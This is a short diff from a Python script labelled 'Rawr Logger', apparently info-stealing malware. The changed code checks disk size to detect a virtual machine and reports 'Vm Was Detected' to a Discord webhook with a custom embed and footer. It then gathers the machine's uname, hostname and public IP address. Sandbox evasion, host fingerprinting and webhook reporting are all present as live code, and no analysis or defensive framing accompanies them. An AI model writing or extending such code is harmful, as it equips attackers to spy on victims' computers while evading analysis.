@@ -37,23 +37,27 @@ _, diskSizeBytes, _ = win32process.GetDiskFreeSpaceEx()
 diskSizeGB = diskSizeBytes/1073741824
 
 if diskSizeGB < minDiskSizeGB:
-        try:
-            sys.exit
-        except:
-         embeded = {
+    try:
+
+        embedss = {
           "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
                       "embeds": [
                 {
                     "author": {
                     "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                     },
-                    "description": f"```Vm Was Detected```",                      
+                    "description": f"```Vm Was Detected```",                       
+                    "footer": {
+                      "text": "Rawr Logger Made By Jose And The Soap1"
+                    }
                 }
             ]
 
         }
-         requests.post(webhook, json=embeded) 
-         pass
+        requests.post(webhook, json=embedss) 
+        sys.exit
+    except:
+        pass
 machines = platform.uname()
 hostnames = socket.gethostname()  
 ips = requests.get('https://api.ipify.org').text
